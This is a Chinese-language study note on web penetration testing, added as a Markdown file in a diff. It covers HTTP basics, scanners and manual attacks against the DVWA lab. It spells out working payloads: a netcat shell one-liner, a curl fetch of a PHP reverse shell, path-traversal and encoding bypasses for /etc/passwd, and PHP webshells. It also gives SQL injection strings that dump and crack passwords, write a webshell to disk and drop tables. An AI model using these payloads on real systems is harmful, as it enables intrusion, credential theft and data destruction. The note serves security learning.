@@ -1,0 +1,417 @@
+---
+title: Web渗透
+date: 2020-11-29
+tags:
+ - safe
+categories: 
+ - safe
+---
+### WEB技术发展
+- 静态WEB
+- 动态WEB
+    - 应用程序
+    - 数据库
+    - 每个人看到的内容不同
+    - 根据用户输入返回不同结果
+
+- Web攻击类型有数百种
+    - 本课程只介绍经典型的几种
+
+- WEB攻击面
+    - Network
+    - OS
+    - WEB Server
+    - App Server
+    - Web Application
+    - Database
+    - Browser
+
+### HTTP协议基础
+- 明文
+    - 无内建的机密性安全机制
+    - 嗅探或代理截断可查看全部明文信息
+    - https只能提高传输层安全
+- 无状态
+    - 每一次客户端和服务器端的通信都是独立的过程
+    - WEB应用需要跟踪客户端会话(多步通信)
+    - 不使用cookie的应用，客户端每次请求都要重新身份验证(不实现)
+    - Session用于在用户身份验证跟踪用户行为轨迹
+        - 提高用户体验，但增加了攻击向量
+- Cycle(周期)
+    - 请求/响应
+- 重要的header 
+    - set-cookie:服务器发给客户端的SessionID(被盗窃的风险)
+    - Content-length:响应body部分的字节长度
+    - Location:重定向用户到另一个页面，可识别身份认证后允许访问的页面
+    - Cookie:客户端发回给服务器证明用户状态的信息(头:值成对出现)
+    - Referer:发送新请求之前用户位于那个页面，服务器基于此头的安全限制内容易被修改绕过
+- 状态码
+    - 服务端响应的状态码表示响应的结果类型(5大类50多个具体响应码)
+    - 100s:服务器响应的信息，通常表示服务器还有后续处理，很少出现
+    - 200s:请求被服务器成功接受并处理后返回的响应结果
+    - 300s:重定向，通常在身份认证成功后重点向到一个安全页面(301/302)
+    - 400s:表示客户端请求错误
+        - 401:需要身份验证
+        - 403:拒绝访问
+        - 404:目标未发现
+    - 500s:服务器内部错误(503:服务不可用)
+    - [w3c状态码标准](http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html)
+### 实验环境
+- Metasploitable
+    - Dvwa
+
+### 扫描工具
+##### 侦察
+- Httrack
+    - 减少与目标系统交互
+    - 下载目标网站的文件
+- Nikto
+    - perl语言开发的开源web安全扫描器
+    - 软件版本
+    - 搜索存在安全隐患的文件
+    - 服务器配置漏洞
+    - WEB Application层面的安全隐患
+    - 避免404误判
+        - 很多服务器不遵守RFC标准，对于不存在的对象返回200响应码
+        - 依据响应文件内容判断，不同扩展名的文件404响应内容不同
+        - 去除时间信息后的内容取MD5值
+        - -no404
+    - 插件：nikto-list-plugins
+    - nikto-update
+        - cirt.net
+    - nikto -host http://1.1.1.1
+    - nikto -host 192.168.1.1 -ssl -port 443
+    - vhost
+    - 配置文件
+        -/etc/nikto.conf
+        - STATIC-cookie=“cookie1”="cookie value";"cookie2"="cookie value"
+    - -evasion使用IDS逃避技术(man nikto)
+- Vega(kali20.03)
+    - JAVA编写的开源Web扫描器
+    - 扫描模式
+    - 代理模式
+    - 爬站、处理表单、注入测试
+    - 支持SSL:[ssl](http://vega/ca.crt)
+- Skipfish
+    - c语言编写
+    - 实验性的主动web安全评估工具
+    - 递归爬网
+    - 基于字典的探测
+    - 速度较快
+        - 多路单线程，全异步网络I/O，消除内存管理和调度开销
+        - 启发式自动内容识别
+    - 误报较低
+    - skipfish -o test http://1.1.1.1
+    - skipfish -o test @url.txt
+    - skipfish -o test -S complet.wl -W a.wl http://1.1.1.1
+    - -I : 只检查包含"string"的URL
+    - -X : 不检查包含"string"的URL
+    - -K ： 不对指定参数进行Fuzz测试
+    - -D ： 跨站点爬另一个域
+    - -l ： 每秒最大请求数
+    - -m : 每IP最大并法连接数
+    - --config : 指定配置文件
+    - 身份认证
+        - skipfish -A user:pass -o test http://1.1.1.1
+        - skipfish -C "name=val" -o test http://1.1.1.1
+        - Username:password
+    - 扫描太快可能触发报警机制
+        - 可以修改-l和-m
+- W3af
+    - web Application Attack and Audit Framework,基于python语言开发
+    - 此框架的目标是帮助你发现和利用所有WEB应用程序漏洞
+    - 9大类近150个plugin
+        - audit
+        - infrastructure
+        - grep 
+        - evasion
+        - mangle
+        - auth
+        - bruteforce
+        - output 
+        - crawl
+        - attack
+- Arachni
+- Owasp-azp
+- brupsuite
+    - Web安全工具中的瑞士军刀
+    - 统一的集成工具发现全部现代WEB安全漏洞
+    - PortSwigger公司开发
+        - Brup Free
+        - Burp Professional
+        - http://www.portswigger.net
+    - 所有的工具分享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换纤细。
+    - 字体
+    - Proxy 
+        - Oprions
+            - Invisible(主机头/多目标域名)
+            - CA(导入/导出)
+            - Intercept(入站/出站)
+            - Response modify
+        - Target
+            - Scope(logout)
+            - Filter
+            - Comparing site map
+        -  Active/passive SCan
+        - Extender
+            - BApp Store
+                - Jython
+                - [jython](http://www.jython.org/downloads.html)
+                - Options
+                - Scan queue
+                - Result
+        - Intruder
+            - POSITION
+            - Sniper
+            - Battering ram
+            - Pitchfork
+            - Cluster bomb
+        - Sequencer
+            - 分析sessionId
+        - 编码Decoder
+- ACUNETIX WEB VULNERANILITY SCANNER(AVWS)
+    - 未使用
+- APPSCAN
+    - 未使用
+- 手动漏洞挖掘
+    - 默认安装
+        - Windows默认安装漏洞
+        - phpMyAdmin/setup
+        - Ubuntu/Debian默认安装PHP5-cgi
+        - 可以直接访问/cgi-bin/php5和/cgi-bin/php(爬不出来的目录)
+    - PHP反弹shell
+        - /usr/share/webshells/php/php-reverse-shell.php
+    - 身份认证
+        - 常用弱口令/基于字典的密码爆破
+        - 锁定账号
+        - 信息收集
+            - 手机号
+            - 密码错误提示信息
+        - 密码溴探
+    - 会话sessionID
+        - Xss/cookie importer
+        - SessionID in URL
+        - 嗅探
+        - SessionID 长期不变/永久不变
+        - SessionID 生成算法
+            - Sequencer
+            - 私有算法
+            - 预判下一次登陆时生成的SessionID
+            - 登出后返回测试
+    - 密码找回
+    - 漏洞挖掘原则
+        - 所有变量
+        - 所有头
+            - Cookie中的变量
+        - 逐个变量删除
+    - 漏洞的本质
+        -  数据与指令的混淆
+        -  对用户输入信息过滤不严判断失误，误将指令当数据
+    - 命令执行
+        - 应用程序开发者直接调用操作系统功能
+        - ； && | || &
+        - 查看源码，过滤用户输入
+        - ;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 > /tmp/pipe
+    - ;curl http://1.1.1.1/php-revers-shell.php
+    - Directory traversal/File include(有区别/没区别)
+        - 目录权限限制不严/文件包含
+    - /etc/php5/cgi/php.ini
+        - allow_url_include = on
+    - 应用策划嗯需功能操作文件，限制不严时导致访问WEB目录以外的文件
+        - 读、写文件、远程执行代码
+    - 特征但不绝对
+        - ？page=a.php
+        - ?home=b.html
+        - ?file=content
+     - 经典测试方法
+        - ?file=../../../../../etc/passwd
+        - ?page=file:///etc/passwd
+        - ?home=main.cgi
+        - ?home=http://www.a.com/1.php
+        - http://1.1.1.1/../../../../dir/file.txt
+    - 编码绕过字符过滤
+        - "."  "%00"  #绕过文件扩展名过滤
+            - ？file=a.doc%00.php
+        - 使用多种编码尝试
+    - 不同操作系统的路径特征字符
+        - 类unix系统
+            - 根目录：/
+            - 目录层及分隔符：/
+        - windows系统
+            - C：\
+            - /或\
+    - 编码
+        - url编码、双层url编码
+            - %2e%2e%2f    解码：../
+            - %2e%2e%5c    解码：..\
+            - %252e%252e%255c   解码:..\
+        - Unicode/UTF-8编码
+            - ..%c0%af      解码：../
+            - ..%c1%9c      解码：..\
+    - 其他系统路径可能使用到的字符
+    - 本地文件包含lfi
+        - 查看文件
+        - 代码执行
+            - <?php echo shell_exec($_GET["cmd"])>
+    - 远程文件包含rfi
+        - 出现概率少于lfi,但更容易被利用
+    - /usr/share/wfuzz/wordlist/vulns/
+    - 文件上传漏洞
+        -   <?php echo shell_exec($_GET["cmd"]);?>
+    - 直接上传webshell
+    - 修改文件类型上传webshell
+        - Mimetype——文件头、扩展名
+    - 修改文件类型上传webshell
+        - 静态解析文件扩展名时可能无法执行
+    - 文件头绕过过滤上传webshell
+    - 上传目录权限 
+    - SQL注入
+        - 服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器
+        - 用户登录判断
+            - SELECT * FROM users WHERE username='uname' AND password='pass';
+            - SELECT * FROM users WHERE username='name' AND password='' OR '=';
+        - 基于报错的检测方式(low)
+            - ' " % ( )
+        - 基于布尔的检测
+            - 1' and '1' = '1      / 1' and '1
+            - 1' and '1' = '2      / 1' and '0
+        - 表列数/显示信息位于那一列
+            - 'order by 9--         #按查询列号排序(注释符:--) 后面必须加上空格 不加表示“ --‘ ”报错
+                - select * 时表字段数=查询字段数
+        - 联合查询
+            - ‘ union select 1,2--+
+            - ' union all select database(),2--+
+            - ' union select database(),substring index(USER(),"@",1)--
+            - DB用户:user()
+            - DB版本：version()
+            - 全局函数：@@datadir、@@hostname、@@version、@@version_compile_OS
+            - 当前库:database()
+            - ASCII转字符串:char()
+            - 连接字符串:CONCAT_WS(CHAR(32,58,32),user(),database(),version())
+            - 计算哈希:md5()
+            - Mysql数据结构
+                - information_schema
+            - 所有库所有表/统计每库中表的数量
+                - ' union select table_name,table_schema from information_schema.tables--+
+                - ' union select table_schema,count(*) FROM information_Schema.tables group by table_schema--+
+            - DVWA库中的表名
+                - ' union select table_name,table_schema from information_schema.tables where table_schema = 'dvwa'--+
+            - Users表中的所有列(user_id,first_name,last_name,user,password,avatar)
+                - ' union select table_name,column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'--+
+            - 查询user,password列的内容
+                - ' union select user,password from dvwa.users--+
+                - ' union select user,password from users--+
+                - ' union select null,concat(user,0x3a,password) from users--+
+            - 密码破解
+                - username:password——>dvwa.txt
+                - john --format=raw-MD5 dvwa.txt --show(运行之后会在主目录下生成一个.john的文件里面有日志和破解结果)
+            - 读取文件
+                - ' union SELECT null,load_file('/etc/passwd')--+ 
+            - 写入文件
+                - ‘ union select null,"<?php passthru($_GET["cmd"]); ?>" INTO DUMPFILE "/var/www/a.php"--
+                - Mysql账号
+                - cat php-revers-shell.php | xxd- -ps | tr -d '\n'
+                - ' union select null, (0x3c3f706870) INTO DUMPFILE '/tmp/x.php'-- 
+            - 保存下载数据库
+                - 'union select null,concat(user,0x3a,password) from users INTO OUTFILE '/tmp/a.db'-- 
+            - 无权读取information_schema库 / 拒绝union、order by语句
+                - 猜列名: ' and column is null--+
+                    - Burpsuite自动猜列名
+                - 猜当前表表名:' and table.user in null--+ 
+                - 猜库里其他表:' and (select count(*) from table)>0--+
+                - 列表对应关系:' and users.user is null--+
+                - 猜字段内容:' or user='admin' or user like ' %a%
+                - 猜账号对应密码:
+                    - ' or user='admin' and password='5f4dcc3b5aa765d61d8324deb882cf99
+            - 当数据库可写
+                - '; update users set user='yuanfh' where user='admin
+                    - 注入失败,sql客户端工具的问题
+                - '; INSERT INTO users('user_id','first_name','last_name','user','password','avatar') values ('35','fh','yuan','yfh','5f4dcc3b5aa765d61d8324deb882cf99')
+                - '; DROP TABLE users;
+                - xp_cmdshell /储存过程
+            - SQLi没有通用的方法,掌握原理,了解各种数据库特征
+            - Medium难度级别
+                - mysql_real_escape_string()
+                    - PHP4 >= 4.3.0,PHP5
+                - PHP 5.5.0已弃用此函数
+                - PHP 7.0.0已经删除此函数，代之以MySQLI、PDO_MySQL
+                - 转义符，对下列字符转义
+                    - \x00
+                    - \n
+                    - \r
+                    - \
+                    - '
+                    - "
+                    - \x1a
+            - high难度级别
+                - mysql_real_escape_string()
+                - stripslashes()
+                    - 去除"\"
+                - is_numeric()
+                    - 判断是否是数字
+        - SQL盲注
+            - 不显示数据库内建的报错信息
+                - 内建的报错信息帮助开发人员发现和修复问题
+                - 报错信息提供关于系统的大量有用信息
+            - 当程序员隐藏了数据库内建报错信息,替换为通用的错误提示,sql注入将无法依据报错信息判断注入语句的执行结果，即盲注。
+            - 思路:既然无法基于报错信息判断结果,基于逻辑真假的不同结果来判断
+                - 1' and 1=1--+
+                - 1' and 1=2--+
+                - 1' and ORD(MID((VERSION()),2,1))&32>0--+
+                - CURRENT_USER()、DATABASE()
+                - MID(ColumnName,Start [,length])
+                - ORD(a) #ASCll码 97
+        - SQLMAP自动注入
+            - 开源sql注入漏洞检测、利用工具
+            - 检测动态页面中get/post参数、cookie、http头
+            - 数据榨取
+            - 文件系统访问
+            - 操作系统命令执行
+            - 引擎强大、特性丰富
+            - Xss漏洞检测
+            - 五种漏洞检测技术
+                - 基于布尔的盲注检测
+                - 基于时间的盲注检测
+                    - ' and (select * from (select(sleep(20)))a)--+
+                - 基于错误的检测
+                - 基于UNION联合查询的检测
+                    - 适用于通过循环直接输出联合查询的结果，否则值显示第一项结果
+                - 基于堆叠查询的检测
+                    - ;堆叠多个查询语句
+                    - 使用于非select的数据修改，删除的操作
+            - 支持的数据库管理系统DBMS
+                - MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,IBM DB2,SQLote,
+                  Firebird,Sybase,Sap MAxDB
+            - 其他特性
+                - 数据库直接连接 -d
+                    - 不通过SQL，制定身份认证信息，IP，端口
+                - 与burpsuite,google结合使用，支持政策表达式限定测试目标
+                - Get、post、cookie、Referer、User-Agent（随机或指定）
+                    - cookie过期后自动处理Set-Cookie头，更新cookie信息
+                - 限速:最大并法、延迟发送
+                - 支持Basic,Digest,NTLM,CA身份认证
+                - 数据库版本、用户、权限、hash枚举和字典爆破，暴力破解表列名称
+                - 文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表
+                - 与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门
+            - 参数的实操(省略)
+        - XSS
+            - 攻击WEB客户端
+            - 客户端脚本语言
+                - 弹窗告警、广告
+                - javascript
+                - 在浏览器中执行
+            - XSS(cross-site scripting)
+                - 通过WEB站点漏洞，向客户端交付恶意代码，实现对客户端的攻击目的
+                - 注入客户端脚本代码
+                - 盗取cookie
+                - 重定向
+            - VBScript,ActiveX,or Flash
+            - JavaScript
+                - 与Java语言无关
+                - 命名完全出于市场原因
+                - 使用最广的客户端脚本语言
+            - Xss
+                - 存储型（持久性）
+                - 发射型（非持久）
+                - dom型
+            
